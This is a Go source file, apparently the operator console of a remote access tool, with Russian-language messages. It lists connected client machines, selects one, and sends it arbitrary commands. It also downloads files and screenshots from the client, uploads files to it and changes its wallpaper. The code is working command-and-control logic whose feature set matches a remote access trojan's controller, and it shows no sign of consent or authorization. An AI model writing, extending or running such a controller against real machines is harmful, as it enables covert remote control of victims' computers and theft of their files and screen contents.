package server

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/nb-322/SnorkProject/internal/protocol"
)

type CLI struct {
	server       *Server
	activeClient *Client
}

func (c *CLI) prompt() string {
	if c.activeClient == nil {
		return "[no client] > "
	}
	return fmt.Sprintf("[%s]> ", c.activeClient.Username)
}

func (c *CLI) checkEvents() {
	for msg := range c.server.Events {
		fmt.Printf("\r%s\n%s", msg, c.prompt())
	}
}

func NewCLI(server *Server) *CLI {
	return &CLI{server: server, activeClient: nil}
}
func (c *CLI) handleDownload(parts []string) error {
	if len(parts) < 2 {
		fmt.Println("Использование: download <filename>")
		return nil
	}
	remotePath := parts[1]

	localFilename := remotePath
	if idx := strings.LastIndexAny(remotePath, "/\\"); idx >= 0 {
		localFilename = remotePath[idx+1:]
	}
	if localFilename == "" {
		localFilename = remotePath
	}

	c.activeClient.Conn.SetReadDeadline(time.Now().Add(120 * time.Second))
	resp, err := protocol.ReliableReceive(c.activeClient.Conn)
	if err != nil {
		return err
	}
	if strings.Contains(resp.Response, "File Not Found") {
		fmt.Println("Файл не найден на клиенте")
		return nil
	}
	if !strings.Contains(resp.Response, "File Exists") {
		fmt.Println("Неожиданный ответ:", resp.Response)
		return nil
	}

	c.activeClient.Conn.SetDeadline(time.Time{})
	if err := protocol.ReliableSend(c.activeClient.Conn, protocol.Message{
		Command: "download", Response: "send file",
	}); err != nil {
		return err
	}

	if err := protocol.ReceiveFile(c.activeClient.Conn, localFilename); err != nil {
		return err
	}
	fmt.Printf("[+] Файл сохранён: %s\n", localFilename)
	return nil
}

func (c *CLI) handleUpload(parts []string) error {
	if len(parts) < 2 {
		fmt.Println("Использование: upload <filename>")
		return nil
	}
	filename := parts[1]

	c.activeClient.Conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	resp, err := protocol.ReliableReceive(c.activeClient.Conn)
	if err != nil {
		return fmt.Errorf("upload: waiting for ready: %w", err)
	}
	if !strings.Contains(resp.Response, "ready") {
		return fmt.Errorf("upload: unexpected response: %s", resp.Response)
	}

	c.activeClient.Conn.SetDeadline(time.Time{})
	if err := protocol.SendFile(c.activeClient.Conn, filename); err != nil {
		return err
	}
	fmt.Println("[+] Файл успешно загружен на клиента:", filename)
	return nil
}

func (c *CLI) handleScreenshot(parts []string) error {
	c.activeClient.Conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	resp, err := protocol.ReliableReceive(c.activeClient.Conn)
	if err != nil {
		return err
	}
	if !strings.Contains(resp.Response, "Screenshot saved to::") {
		fmt.Println(resp.Response)
		return nil
	}

	remotePath := strings.TrimSpace(strings.Split(resp.Response, "::")[1])
	username := strings.ReplaceAll(c.activeClient.Username, "\\", "-")
	localFilename := fmt.Sprintf("screenshot-%s-%s.png", username, time.Now().Format("2006-01-02_15-04-05"))

	c.activeClient.Conn.SetDeadline(time.Time{})
	if err := protocol.ReliableSend(c.activeClient.Conn, protocol.Message{
		Command: "download " + remotePath,
	}); err != nil {
		return err
	}

	c.activeClient.Conn.SetReadDeadline(time.Now().Add(15 * time.Second))
	fileResp, err := protocol.ReliableReceive(c.activeClient.Conn)
	if err != nil {
		return err
	}
	if !strings.Contains(fileResp.Response, "File Exists") {
		fmt.Println("Скриншот не найден:", fileResp.Response)
		return nil
	}

	c.activeClient.Conn.SetDeadline(time.Time{})
	if err := protocol.ReliableSend(c.activeClient.Conn, protocol.Message{
		Command: "download", Response: "send file",
	}); err != nil {
		return err
	}

	if err := protocol.ReceiveFile(c.activeClient.Conn, localFilename); err != nil {
		return err
	}
	fmt.Printf("[+] Скриншот сохранён: %s\n", localFilename)
	return nil
}
func (c *CLI) handleWallpaper(parts []string) error {
	if len(parts) < 2 {
		fmt.Println("Использование: wallpaper <filename>")
		return nil
	}
	filename := parts[1]
	c.activeClient.Conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	resp, err := protocol.ReliableReceive(c.activeClient.Conn)
	if err != nil {
		return fmt.Errorf("wallpaper: waiting for ready: %w", err)
	}
	if !strings.Contains(resp.Response, "ready") {
		return fmt.Errorf("wallpaper: unexpected response: %s", resp.Response)
	}
	c.activeClient.Conn.SetDeadline(time.Time{})
	if err := protocol.SendFile(c.activeClient.Conn, filename); err != nil {
		return err
	}
	fmt.Println("Файл обоев отправлен, ожидаем установки...", filename)
	c.activeClient.Conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	resp, err = protocol.ReliableReceive(c.activeClient.Conn)
	if err != nil {
		return err
	}
	if !strings.Contains(resp.Response, "success") {
		return fmt.Errorf("wallpaper: unexpected response: %s", resp.Response)
	}
	fmt.Printf("[+] Обои успешно установлены: %s\n", filename)
	return nil
}

func (c *CLI) sendCommand(input string) error {
	c.activeClient.Conn.SetDeadline(time.Time{})
	if err := protocol.ReliableSend(c.activeClient.Conn, protocol.Message{Command: input}); err != nil {
		return err
	}

	parts := strings.SplitN(input, " ", 2)
	if len(parts) == 0 {
		return nil
	}

	switch parts[0] {
	case "upload":
		return c.handleUpload(parts)
	case "download":
		return c.handleDownload(parts)
	case "screenshot", "screen":
		return c.handleScreenshot(parts)
	case "wallpaper":
		return c.handleWallpaper(parts)

	default:
		c.activeClient.Conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		resp, err := protocol.ReliableReceive(c.activeClient.Conn)
		if err != nil {
			return err
		}
		fmt.Println(resp.Response)
		return nil
	}
}
func (c *CLI) listClients() {
	clients := c.server.GetClients()
	if len(clients) == 0 {
		fmt.Println("Нет подключённых клиентов.")
		return
	}
	fmt.Println("Подключённые клиенты:")
	for i, cl := range clients {
		fmt.Printf("[%d] %s\n", i+1, cl)
	}
}

func (c *CLI) useClient(id string) {
	idx, err := strconv.Atoi(id)
	clients := c.server.GetClients()
	if err != nil || idx < 1 || idx > len(clients) {
		fmt.Println("Неверный номер клиента.")
		return
	}
	c.activeClient = clients[idx-1]
	fmt.Printf("[+] Выбран клиент: %s\n", c.activeClient)
}

func (c *CLI) Run() {
	go c.checkEvents()
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(c.prompt())

		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("read error:", err)
			continue
		}
		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		if input == "exit" {
			fmt.Println("Exiting...")
			os.Exit(0)
		}
		if c.activeClient == nil {
			if input == "list" {
				c.listClients()
			} else if strings.HasPrefix(input, "use ") {
				id := strings.TrimPrefix(input, "use ")
				c.useClient(id)
			} else {
				fmt.Println("Нет активного клиента. Доступные команды: list, use <id>, exit")
			}
		} else {
			if input == "q" {
				c.activeClient = nil
				fmt.Println("Клиент отключён от CLI.")
			} else {
				if err := c.sendCommand(input); err != nil {
					fmt.Println("Ошибка:", err)
					c.server.RemoveClient(c.activeClient.ID)
					c.activeClient = nil
				}
			}
		}
	}
}
